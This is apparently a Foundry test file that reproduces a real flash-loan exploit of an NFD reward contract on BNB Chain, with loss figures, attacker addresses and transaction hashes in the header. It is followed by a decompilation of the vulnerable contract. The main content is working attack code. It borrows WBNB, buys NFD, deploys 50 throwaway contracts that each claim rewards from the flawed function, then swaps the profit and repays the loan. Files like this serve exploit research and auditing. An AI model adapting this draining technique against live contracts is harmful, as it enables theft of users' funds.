// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 4481 BNB (~125M US$)
// Attacker : 0x22c9736d4fc73a8fa0eb436d2ce919f5849d6fd2
// Attack Contract : 0xa35ef9fa2f5e0527cb9fbb6f9d3a24cfed948863
// Vulnerable Contract : 0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e
// Attack Tx1 : 0x1fea385acf7ff046d928d4041db017e1d7ead66727ce7aacb3296b9d485d4a26 (-2952.97 BNB)
// Attack Tx2 : 0xb6f9b5ef1feeadb379a2de8f79bb04dd6920bfb214136d057eed4ce23a0003f8 (-1412.77 BNB)
// Attack Tx3 : 0x8b77d75efa185295b09bdf2edcb509541fdde40ed5484212331ceac41b2f4ac0 (-115.57  BNB)

// @Info
// WBNB-USDT Pair : 0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae
// USDT-NFD Pair  : 0x26c0623847637095655b2868c3182b2285bdaeaf

// @Analysis
// PeckShield : https://twitter.com/peckshield/status/1567710274244825088
// Beosin : https://twitter.com/BeosinAlert/status/1567757251024396288
// Blocksec : https://twitter.com/BlockSecTeam/status/1567706201277988866
// SlowMist : https://twitter.com/SlowMist_Team/status/1567854876633309186
// CertiK : https://mp.weixin.qq.com/s/xGQ9SIxrwOizog3XDnM5iw

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant vulnContract = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;

contract Attacker is Test {
    IPancakeRouter constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant dodo = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;
    address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;

    function setUp() public {
        cheat.createSelectFork("bsc", 21_140_434);
        console.log("---------- Reproduce Attack Tx1 ----------");
        cheat.label(address(PancakeRouter), "PancakeRouter");
        cheat.label(vulnContract, "vulnContractName");
        cheat.label(wbnb, "WBNB");
        cheat.label(dodo, "DODO");
        cheat.label(usdt, "USDT");
        cheat.label(nfd, "NFD");
    }

    function testExploit() public {
        console.log("Flashloan 250 WBNB from DODO DLP...");
        bytes memory data = abi.encode(dodo, wbnb, 250 * 1e18);
        DVM(dodo).flashLoan(0, 250 * 1e18, address(this), data);
    }

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        require(IERC20(wbnb).balanceOf(address(this)) == quoteAmount, "Invalid WBNB amount");
        require(quoteAmount == 250 * 1e18, "Invalid WBNB amount");

        console.log("Swap 250 WBNB to NFD...");
        address[] memory path = new address[](3);
        path[0] = wbnb;
        path[1] = usdt;
        path[2] = nfd;
        IERC20(wbnb).approve(address(PancakeRouter), type(uint256).max);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            quoteAmount, 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[*] NFD balance before attack", IERC20(nfd).balanceOf(address(this)), 18);

        console.log("Abuse the Reward Contract...");
        for (uint8 i; i < 50; i++) {
            Exploit exploit = new Exploit();
            uint256 nfdAmount = IERC20(nfd).balanceOf(address(this));
            IERC20(nfd).transfer(address(exploit), nfdAmount);
            exploit.abuse();
        }

        emit log_named_decimal_uint("[*] NFD balance after attack", IERC20(nfd).balanceOf(address(this)), 18);

        console.log("Swap the profit...");
        uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));
        path[0] = nfd;
        path[1] = usdt;
        path[2] = wbnb;
        IERC20(nfd).approve(address(PancakeRouter), type(uint256).max);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            nfdBalance, 0, path, address(this), block.timestamp
        );

        console.log("Repay the flashloan...");
        IERC20(wbnb).transfer(msg.sender, 250 * 1e18);

        emit log_named_decimal_uint("Attacker's Net Profit", IERC20(wbnb).balanceOf(address(this)), 18);
    }
}

contract Exploit is Test {
    address constant rewardContract = vulnContract;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;

    // Function 0xe2f9d09c
    function abuse() external {
        rewardContract.call(abi.encode(bytes4(0x6811e3b9)));
        uint256 bal = IERC20(nfd).balanceOf(address(this));
        require(IERC20(nfd).transfer(msg.sender, bal), "Transfer profit failed");
    }
}

/* -------------------- Decompiled Vulnerable Contract 0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e -------------------- */

/*

// Data structures and variables inferred from the use of storage instructions
uint256 stor_4; // STORAGE[0x4]
uint256 stor_6; // STORAGE[0x6]
uint256 stor_7; // STORAGE[0x7]
uint256 stor_8; // STORAGE[0x8]
mapping (uint256 => [uint256]) _manager; // STORAGE[0x9]
uint256 stor_b; // STORAGE[0xb]
uint256 stor_c; // STORAGE[0xc]
mapping (uint256 => [uint256]) owner_d; // STORAGE[0xd]
mapping (uint256 => [uint256]) map_e; // STORAGE[0xe]
mapping (uint256 => [uint256]) map_f; // STORAGE[0xf]
address _owner; // STORAGE[0x0] bytes 0 to 19
uint8 stor_5_0_0; // STORAGE[0x5] bytes 0 to 0
address stor_2_0_19; // STORAGE[0x2] bytes 0 to 19
address _isAirAddr; // STORAGE[0x3] bytes 0 to 19
uint160 stor_a_0_19; // STORAGE[0xa] bytes 0 to 19
uint160 _uniswapV2Pair; // STORAGE[0x10] bytes 0 to 19
uint160 stor_11_0_19; // STORAGE[0x11] bytes 0 to 19

// Events
OwnershipTransferred(address, address);

function 0x165a8104(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    stor_7 = varg0;
    emit 0xf74522b699eb1e736fbc4015ff4612e193066b928e4bf55d3f9f7970c0bd05a8(stor_7);
}

function 0x176069e3() public nonPayable { 
    return stor_7;
}

function 0x1b856149(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    stor_6 = varg0;
    emit 0x9cf8c6d107f8e787a8a0582377cfb42f047768b0a1f96f3a4e67e9c79f3a4bf5(stor_6);
}

function 0x1f6c647e(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    stor_b = varg0;
    emit 0x7d7c5a32ef7976599b8e6059c3210fc6ae8017317568c6fb643f26e47a50c5f7(stor_b);
}

function 0x2ea7088b(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    return map_f[address(varg0)];
}

function _SafeDiv(uint256 varg0, uint256 varg1) private { 
    if (varg0 > 0) {
        assert(varg0);
        return varg1 / varg0;
    } else {
        v0 = new array[](v1.length);
        v2 = v3 = 0;
        while (v2 < v1.length) {
            MEM[v0.data + v2] = v1[v2];
            v2 = v2 + 32;
        }
        if (26) {
            MEM[v0.data] = ~0xffffffffffff & MEM[v0.data];
        }
        revert(v0);
    }
}

function 0x3182(uint256 varg0, uint256 varg1) private { 
    if (varg1 != 0) {
        v0 = v1 = varg1 * varg0;
        assert(varg1);
        require(v1 / varg1 == varg0, 'SafeMath: multiplication overflow');
    } else {
        v0 = v2 = 0;
    }
    return v0;
}

function () public payable { 
}

function changeRouter(address varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    _uniswapV2Pair = varg0;
}

function 0x37a7f92b(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    stor_11_0_19 = address(varg0);
}

function 0x3ac8730e() public nonPayable { 
    return stor_a_0_19;
}

function 0x3d4b9272() public nonPayable { 
    return _isAirAddr;
}

function 0x3e42c001() public nonPayable { 
    return stor_11_0_19;
}

function 0x450d8418() public nonPayable { 
    return stor_b;
}

function uniswapV2Pair() public nonPayable { 
    return _uniswapV2Pair;
}

function 0x520adcf0(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    v0 = address(varg0).call().value(this.balance).gas(!this.balance * 2300);
    require(v0); // checks call status, propagates error data on error
}

function 0x556dd2dc(uint256 varg0, uint256 varg1, uint256 varg2, uint256 varg3) public nonPayable { 
    require(msg.data.length - 4 >= 128);
    require(0xff & _manager[msg.sender] == 1);
    require((address(varg0)).code.size);
    v0, v1 = address(varg0).transferFrom(address(varg1), address(varg2), varg3).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
}

function 0x56d7f5c6() public nonPayable { 
    return stor_4;
}

function withdrawal(address varg0, uint256 varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    require(_isAirAddr.code.size);
    v0, v1 = _isAirAddr.transfer(varg0, varg1).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
}

function isAirAddr(address varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_isAirAddr.code.size);
    v0, v1 = _isAirAddr.call(0xdb9641d6, varg0).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    return v1;
}

function 0x66240220() public nonPayable { 
    return stor_8;
}

function 0x6811e3b9() public nonPayable { 
    require(_isAirAddr.code.size);
    v0, v1 = _isAirAddr.balanceOf(msg.sender).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require(v1 > 0, 'Amount can not be Zero');
    if (owner_d[msg.sender] <= 0) {
        owner_d[msg.sender] = stor_6;
    }
    v2 = _SafeDiv(stor_8, block.timestamp - owner_d[msg.sender]);
    require(v2 > 0, 'The collection time was not reached');
    v3 = v4 = 0;
    if (block.timestamp > stor_7) {
        if (v2 > 0) {
            v5 = 0x3182(stor_b, v1);
            v3 = v6 = _SafeDiv(0xf4240, v5);
        }
    } else if (v2 > 0) {
        v7 = 0x3182(stor_b, v1);
        v8 = 0x3182(v2, v7);
        v3 = v9 = _SafeDiv(0xf4240, v8);
    }
    require(_isAirAddr.code.size);
    v10, v11 = _isAirAddr.transfer(msg.sender, v3).gas(msg.gas);
    require(v10); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    owner_d[msg.sender] = block.timestamp;
}

function renounceOwnership() public nonPayable { 
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    emit OwnershipTransferred(_owner, 0);
    _owner = 0;
}

function 0x76fc7ac2(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    require(_isAirAddr.code.size);
    v0, v1 = _isAirAddr.balanceOf(address(varg0)).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require(v1 > 0, 'Amount can not be Zero');
    if (owner_d[address(varg0)] <= 0) {
        owner_d[address(varg0)] = stor_6;
    }
    v2 = _SafeDiv(stor_8, block.timestamp - owner_d[address(varg0)]);
    require(v2 > 0, 'The collection time was not reached');
    v3 = v4 = 0;
    if (block.timestamp > stor_7) {
        if (v2 > 0) {
            v5 = 0x3182(stor_b, v1);
            v3 = v6 = _SafeDiv(0xf4240, v5);
        }
    } else if (v2 > 0) {
        v7 = 0x3182(stor_b, v1);
        v8 = 0x3182(v2, v7);
        v3 = v9 = _SafeDiv(0xf4240, v8);
    }
    require(_isAirAddr.code.size);
    v10, v11 = _isAirAddr.transfer(address(varg0), v3).gas(msg.gas);
    require(v10); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    owner_d[address(varg0)] = block.timestamp;
}

function 0x84af0fcc(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    stor_8 = varg0;
    emit 0x117894c501424f40a6b56d8dd3e6aa1f1327b9aed040771359011cdcd785e6b(stor_8);
}

function owner() public nonPayable { 
    return _owner;
}

function 0x8e6ced06(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    return owner_d[address(varg0)];
}

function 0x8fd6196c() public nonPayable { 
    return stor_6;
}

function 0x8fd81532(uint256 varg0, uint256 varg1) public payable { 
    require(msg.data.length - 4 >= 64);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    require(stor_2_0_19.code.size);
    v0, v1 = stor_2_0_19.transfer(address(varg0), varg1).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
}

function 0x92116ca2(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_isAirAddr.code.size);
    v0, v1 = _isAirAddr.balanceOf(address(varg0)).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require(v1 > 0, 'Amount can not be Zero');
    if (owner_d[address(varg0)] <= 0) {
        owner_d[address(varg0)] = stor_6;
    }
    v2 = v3 = 0;
    v4 = _SafeDiv(stor_8, block.timestamp - owner_d[address(varg0)]);
    if (block.timestamp > stor_7) {
        if (v4 > 0) {
            v5 = 0x3182(stor_b, v1);
            v2 = v6 = _SafeDiv(0xf4240, v5);
        }
    } else if (v4 > 0) {
        v7 = 0x3182(stor_b, v1);
        v8 = 0x3182(v4, v7);
        v2 = v9 = _SafeDiv(0xf4240, v8);
    }
    map_e[address(varg0)] = v2;
}

function withdrawStuckTokens(address varg0, uint256 varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    require(varg0.code.size);
    v0, v1 = varg0.transfer(msg.sender, varg1).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
}

function 0xcbd8b23c() public nonPayable { 
    return stor_c;
}

function 0xcf8465c2(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    return map_e[address(varg0)];
}

function 0xd414e629() public nonPayable { 
    return stor_5_0_0;
}

function manager(address varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    return 0xff & _manager[varg0];
}

function 0xe03b0b0d(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    if (owner_d[address(varg0)] <= 0) {
        owner_d[address(varg0)] = stor_6;
    }
    if (owner_d[address(varg0)] <= block.timestamp) {
        v0 = _SafeDiv(stor_8, block.timestamp - owner_d[address(varg0)]);
        map_f[address(varg0)] = v0;
        exit;
    } else {
        v1 = new array[](v2.length);
        v3 = v4 = 0;
        while (v3 < v2.length) {
            MEM[v1.data + v3] = v2[v3];
            v3 = v3 + 32;
        }
        if (30) {
            MEM[v1.data] = ~0xffff & MEM[v1.data];
        }
        revert(v1);
    }
}

function 0xe2e4ded2(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    return owner_d[address(varg0)];
}

function 0xe9687b7f(uint256 varg0, uint256 varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    _manager[address(varg0)] = varg1 | ~0xff & _manager[address(varg0)];
}

function 0xecef50e2(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_isAirAddr.code.size);
    v0, v1 = _isAirAddr.call(0xc27aafa7, varg0).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    stor_a_0_19 = v1;
    return stor_a_0_19;
}

function transferOwnership(address varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, 'Ownable: caller is not the owner');
    require(varg0 != 0, 'Ownable: new owner is the zero address');
    emit OwnershipTransferred(_owner, varg0);
    _owner = varg0;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        if (!msg.data.length) {
            ();
        }
    } else {
        v0 = function_selector >> 224;
        if (0x6811e3b9 > v0) {
            if (0x3e42c001 > v0) {
                if (0x2ea7088b > v0) {
                    if (0x165a8104 == v0) {
                        0x165a8104();
                    } else if (0x176069e3 == v0) {
                        0x176069e3();
                    } else if (0x1b856149 == v0) {
                        0x1b856149();
                    } else if (0x1f6c647e == v0) {
                        0x1f6c647e();
                    }
                } else if (0x2ea7088b == v0) {
                    0x2ea7088b();
                } else if (0x340ac20f == v0) {
                    changeRouter(address);
                } else if (0x37a7f92b == v0) {
                    0x37a7f92b();
                } else if (0x3ac8730e == v0) {
                    0x3ac8730e();
                } else if (0x3d4b9272 == v0) {
                    0x3d4b9272();
                }
            } else if (0x556dd2dc > v0) {
                if (0x3e42c001 == v0) {
                    0x3e42c001();
                } else if (0x450d8418 == v0) {
                    0x450d8418();
                } else if (0x49bd5a5e == v0) {
                    uniswapV2Pair();
                } else if (0x520adcf0 == v0) {
                    0x520adcf0();
                }
            } else if (0x556dd2dc == v0) {
                0x556dd2dc();
            } else if (0x56d7f5c6 == v0) {
                0x56d7f5c6();
            } else if (0x5a6b26ba == v0) {
                withdrawal(address,uint256);
            } else if (0x63c02ccc == v0) {
                isAirAddr(address);
            } else if (0x66240220 == v0) {
                0x66240220();
            }
        } else if (0xbd61f0a6 > v0) {
            if (0x8da5cb5b > v0) {
                if (0x6811e3b9 == v0) {
                    0x6811e3b9();
                } else if (0x715018a6 == v0) {
                    renounceOwnership();
                } else if (0x76fc7ac2 == v0) {
                    0x76fc7ac2();
                } else if (0x84af0fcc == v0) {
                    0x84af0fcc();
                }
            } else if (0x8da5cb5b == v0) {
                owner();
            } else if (0x8e6ced06 == v0) {
                0x8e6ced06();
            } else if (0x8fd6196c == v0) {
                0x8fd6196c();
            } else if (0x8fd81532 == v0) {
                0x8fd81532();
            } else if (0x92116ca2 == v0) {
                0x92116ca2();
            }
        } else if (0xe03b0b0d > v0) {
            if (0xbd61f0a6 == v0) {
                withdrawStuckTokens(address,uint256);
            } else if (0xcbd8b23c == v0) {
                0xcbd8b23c();
            } else if (0xcf8465c2 == v0) {
                0xcf8465c2();
            } else if (0xd414e629 == v0) {
                0xd414e629();
            } else if (0xd4d2e7f2 == v0) {
                manager(address);
            }
        } else if (0xe03b0b0d == v0) {
            0xe03b0b0d();
        } else if (0xe2e4ded2 == v0) {
            0xe2e4ded2();
        } else if (0xe9687b7f == v0) {
            0xe9687b7f();
        } else if (0xecef50e2 == v0) {
            0xecef50e2();
        } else if (0xf2fde38b == v0) {
            transferOwnership(address);
        }
    }
    revert();
}
*/
